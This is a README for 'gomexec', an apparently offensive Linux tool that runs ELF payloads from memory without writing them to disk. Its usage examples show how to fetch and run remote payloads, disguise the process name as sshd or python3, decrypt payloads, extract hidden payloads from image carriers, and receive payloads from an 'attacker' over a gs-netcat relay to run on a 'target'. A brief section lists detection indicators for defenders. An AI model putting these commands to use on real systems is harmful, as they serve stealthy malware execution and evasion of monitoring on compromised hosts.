# gomexec

Execute ELF binaries straight from memory, no files dropped on disk.

Uses `memfd_create` + `execveat(AT_EMPTY_PATH)`. The ELF runs entirely in RAM with no path string, no tmpfs, and an empty memfd name. Designed as a standalone CLI that composes naturally with stdin pipes.

## Install

**Pre-built binary** from [Releases](https://github.com/ohmymex/gomexec/releases/latest):

```bash
curl -sL https://github.com/ohmymex/gomexec/releases/latest/download/gomexec_linux_amd64.tar.gz | tar xz
chmod +x gomexec
```

Replace `amd64` with your arch: `arm64`, `armv7`, `mips_softfloat`, `mipsle_softfloat`.

**From source** (Linux, Go 1.21+):

```bash
go install github.com/ohmymex/gomexec@latest
```

## Usage

```bash
# basic pipe
cat payload.elf | gomexec

# spoof argv[0]
cat payload.elf | NAME=/usr/bin/python3 gomexec

# pass args to the payload
cat payload.elf | NAME=sshd gomexec -- -D -p 443

# fetch from URL directly, no curl on target needed
URL=https://example.com/payload NAME=/usr/bin/python3 gomexec

# encrypted payload (32-byte key = AES-256-GCM, anything else = XOR)
cat payload.enc | KEY=<64-hex-chars> gomexec

# chain with nightcloak (https://github.com/NumeXx/nightcloak)
# extract a hidden payload from a carrier file, pipe straight into memory
nightcloak reveal carrier.jpg -p pass | NAME=sshd gomexec

# chain with gsocket (https://gsocket.io/deploy)
# gsocket tunnels data over an encrypted relay, no VPS needed
# attacker: cat payload.elf | gs-netcat -s SECRET -l
# target: receive over encrypted tunnel, execute straight into memory
gs-netcat -s SECRET | NAME=sshd gomexec
```

## Environment Variables

| Variable  | Default           | Description                                              |
|-----------|-------------------|----------------------------------------------------------|
| `NAME`    | `/usr/sbin/sshd`  | `argv[0]` shown in `ps aux`                              |
| `URL`     |                   | Fetch payload over TLS instead of stdin                  |
| `KEY`     |                   | Hex-encoded decryption key (32 bytes = AES-256-GCM, other = XOR) |
| `INSECURE`|                   | Set to `1` to skip TLS verification                      |
| `TIMEOUT` | `30`              | Fetch timeout in seconds                                 |
| `DEBUG`   |                   | Set to `1` to print errors to stderr                     |

## How it works

1. Read payload from stdin (or fetch via `URL`)
2. Decrypt if `KEY` is set
3. `memfd_create("", 0)`, anonymous in-memory fd, empty name
4. Write payload into the fd
5. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)`, no path string used
6. Falls back to `/proc/self/fd/[fd]` exec if `execveat` fails

## What defenders see

- `/proc/[pid]/exe` points to `memfd: (deleted)` (unavoidable)
- `execveat` and `memfd_create` are auditable via auditd (`-S execveat -S memfd_create`)
- Falco rules exist for memfd-based execution patterns
- `ps aux` shows the spoofed `NAME`, not the real binary

## Build

```bash
make build-all
```

Outputs static binaries to `dist/` for: `linux/amd64`, `linux/arm64`, `linux/arm`, `linux/mips`, `linux/mipsle`.

## Credits

Inspired by [hackerschoice/memexec](https://github.com/hackerschoice/memexec).

## Supported architectures

| Arch     | Binary                   |
|----------|--------------------------|
| x86\_64  | `gomexec_linux_amd64`    |
| aarch64  | `gomexec_linux_arm64`    |
| ARMv7    | `gomexec_linux_armv7`    |
| MIPS BE  | `gomexec_linux_mips`     |
| MIPS LE  | `gomexec_linux_mipsle`   |
